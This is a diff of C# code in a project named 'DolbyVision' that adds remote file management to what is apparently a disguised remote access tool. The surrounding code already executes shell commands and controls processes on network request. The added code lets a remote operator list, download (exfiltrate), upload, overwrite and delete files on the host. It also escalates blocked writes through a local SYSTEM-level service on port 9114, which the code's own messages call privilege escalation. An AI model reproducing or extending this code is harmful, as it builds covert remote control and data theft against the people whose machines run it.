@@ -239,6 +239,21 @@ namespace DolbyVision
                                 string result = ExecuteCmdViaPipe(command);
                                 writer.WriteLine(result);
                             }
+                            else if (request != null && request.StartsWith("MOVE:"))
+                            {
+                                string[] parts = request.Substring(5).Split('|');
+                                if (parts.Length == 2)
+                                {
+                                    try
+                                    {
+                                        if (File.Exists(parts[1])) File.Delete(parts[1]);
+                                        File.Move(parts[0], parts[1]);
+                                        writer.WriteLine("OK");
+                                    }
+                                    catch (Exception ex) { writer.WriteLine("ERROR: " + ex.Message); }
+                                }
+                                else writer.WriteLine("ERROR: bad params");
+                            }
                             else
                             {
                                 writer.WriteLine("ERROR: unknown command");
@@ -392,6 +407,17 @@ namespace DolbyVision
                         catch { } // 超时退出循环
                         if (ms.Length <= 0) return;
                         string cmd = Encoding.UTF8.GetString(ms.ToArray()).Trim();
+                        // FILE_DOWNLOAD/FILE_UPLOAD需要持续读写stream,直接处理
+                        if (cmd.StartsWith("FILE_DOWNLOAD:", StringComparison.OrdinalIgnoreCase))
+                        {
+                            FileDownload(cmd.Substring(14), stream);
+                            return;
+                        }
+                        if (cmd.StartsWith("FILE_UPLOAD:", StringComparison.OrdinalIgnoreCase))
+                        {
+                            FileUpload(cmd.Substring(12), stream);
+                            return;
+                        }
                         string result = ExecuteCommand(cmd);
                         byte[] resp = Encoding.UTF8.GetBytes(result);
                         stream.Write(resp, 0, resp.Length);
@@ -421,6 +447,19 @@ namespace DolbyVision
                 if (cmd.StartsWith("SHOW:", StringComparison.OrdinalIgnoreCase))
                 {
                     return StartShowPrank(cmd.Substring(5));
+                }
+                if (cmd.StartsWith("FILE_LIST:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return FileList(cmd.Substring(10));
+                }
+
+                if (cmd.StartsWith("FILE_DELETE:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return FileDelete(cmd.Substring(12));
+                }
+                if (cmd.StartsWith("FILE_MKDIR:", StringComparison.OrdinalIgnoreCase))
+                {
+                    return FileMkdir(cmd.Substring(11));
                 }
                 if (cmd.Equals("RESTART_NORMAL", StringComparison.OrdinalIgnoreCase))
                 {
@@ -708,6 +747,182 @@ namespace DolbyVision
                 return "OK: 远程展示已启动(" + mode + ", " + duration + "秒)";
             }
             catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        // ========== 远程文件管理 ==========
+        private static string FileList(string path)
+        {
+            try
+            {
+                if (!Directory.Exists(path)) return "ERROR: 目录不存在";
+                var sb = new StringBuilder();
+                // 上级目录
+                sb.AppendLine("..|<dir>|0|D");
+                foreach (var dir in Directory.GetDirectories(path))
+                {
+                    var name = Path.GetFileName(dir);
+                    sb.AppendLine(name + "|<dir>|0|D");
+                }
+                foreach (var f in Directory.GetFiles(path))
+                {
+                    var fi = new FileInfo(f);
+                    var name = Path.GetFileName(f);
+                    sb.AppendLine(name + "|" + fi.Length + "|" + fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm") + "|F");
+                }
+                return sb.ToString().TrimEnd('\r', '\n');
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private static void FileDownload(string path, NetworkStream stream)
+        {
+            try
+            {
+                if (!File.Exists(path)) { WriteStr(stream, "ERROR: 文件不存在"); return; }
+                byte[] data = File.ReadAllBytes(path);
+                WriteStr(stream, "SIZE:" + data.Length);
+                // 分块发送,每块4KB
+                int blockSize = 4096;
+                int seq = 0;
+                for (int i = 0; i < data.Length; i += blockSize)
+                {
+                    int len = Math.Min(blockSize, data.Length - i);
+                    byte[] block = new byte[len];
+                    Array.Copy(data, i, block, 0, len);
+                    string b64 = Convert.ToBase64String(block);
+                    WriteStr(stream, "DATA:" + seq + ":" + b64);
+                    seq++;
+                    Thread.Sleep(1); // 避免发送过快
+                }
+                WriteStr(stream, "END");
+            }
+            catch (Exception ex) { try { WriteStr(stream, "ERROR: " + ex.Message); } catch { } }
+        }
+
+        private static void FileUpload(string param, NetworkStream stream)
+        {
+            try
+            {
+                // param: <保存路径>:<总大小>[:OVERWRITE][:SYSTEM]
+                string[] parts = param.Split(':');
+                if (parts.Length < 2) { WriteStr(stream, "ERROR: 参数错误"); return; }
+                string savePath = parts[0];
+                long totalSize = long.Parse(parts[1]);
+                bool overwrite = param.Contains(":OVERWRITE");
+                bool forceSystem = param.Contains(":SYSTEM");
+
+                if (File.Exists(savePath) && !overwrite) { WriteStr(stream, "EXISTS"); return; }
+                WriteStr(stream, "READY");
+
+                // 接收分块数据
+                string tempPath = Path.Combine(Path.GetTempPath(), "dv_upload_" + Guid.NewGuid().ToString("N") + ".tmp");
+                using (var fs = new FileStream(tempPath, FileMode.Create, FileAccess.Write))
+                {
+                    while (true)
+                    {
+                        string line = ReadStr(stream);
+                        if (line == null || line == "END") break;
+                        if (line.StartsWith("DATA:"))
+                        {
+                            int colon1 = line.IndexOf(':', 5);
+                            string b64 = line.Substring(colon1 + 1);
+                            byte[] block = Convert.FromBase64String(b64);
+                            fs.Write(block, 0, block.Length);
+                        }
+                    }
+                }
+
+                // 移动到目标路径
+                try
+                {
+                    if (File.Exists(savePath)) File.Delete(savePath);
+                    File.Move(tempPath, savePath);
+                    WriteStr(stream, "OK: 上传成功");
+                }
+                catch (UnauthorizedAccessException)
+                {
+                    // 权限不足,尝试通过SYSTEM服务模式移动
+                    if (MoveFileViaService(tempPath, savePath))
+                        WriteStr(stream, "OK: 上传成功(SYSTEM提权)");
+                    else
+                    {
+                        try { File.Delete(tempPath); } catch { }
+                        WriteStr(stream, "ERROR: 权限不足,请先安装SYSTEM服务");
+                    }
+                }
+                catch (Exception ex)
+                {
+                    try { File.Delete(tempPath); } catch { }
+                    WriteStr(stream, "ERROR: " + ex.Message);
+                }
+            }
+            catch (Exception ex) { try { WriteStr(stream, "ERROR: " + ex.Message); } catch { } }
+        }
+
+        private static string FileDelete(string path)
+        {
+            try
+            {
+                if (File.Exists(path)) { File.Delete(path); return "OK: 文件已删除"; }
+                if (Directory.Exists(path)) { Directory.Delete(path, false); return "OK: 目录已删除"; }
+                return "ERROR: 文件/目录不存在";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private static string FileMkdir(string path)
+        {
+            try
+            {
+                Directory.CreateDirectory(path);
+                return "OK: 目录已创建";
+            }
+            catch (Exception ex) { return "ERROR: " + ex.Message; }
+        }
+
+        private static void WriteStr(NetworkStream stream, string s)
+        {
+            byte[] data = Encoding.UTF8.GetBytes(s + "\n");
+            stream.Write(data, 0, data.Length);
+            stream.Flush();
+        }
+
+        private static string ReadStr(NetworkStream stream)
+        {
+            var ms = new MemoryStream();
+            byte[] buf = new byte[1];
+            while (true)
+            {
+                int r = stream.Read(buf, 0, 1);
+                if (r <= 0) return null;
+                if (buf[0] == (byte)'\n') break;
+                ms.WriteByte(buf[0]);
+            }
+            return Encoding.UTF8.GetString(ms.ToArray()).Trim();
+        }
+
+        private static bool MoveFileViaService(string src, string dst)
+        {
+            try
+            {
+                // 通过本地回环9114请求SYSTEM服务模式移动文件
+                using (var client = new TcpClient())
+                {
+                    client.Connect("127.0.0.1", 9114);
+                    using (var s = client.GetStream())
+                    {
+                        string cmd = "MOVE:" + src + "|" + dst;
+                        byte[] data = Encoding.UTF8.GetBytes(cmd);
+                        s.Write(data, 0, data.Length);
+                        s.Flush();
+                        byte[] resp = new byte[256];
+                        int read = s.Read(resp, 0, resp.Length);
+                        string result = Encoding.UTF8.GetString(resp, 0, read).Trim();
+                        return result.StartsWith("OK");
+                    }
+                }
+            }
+            catch { return false; }
         }
         // ========== 远程进程控制 ==========
         // P/Invoke for process owner
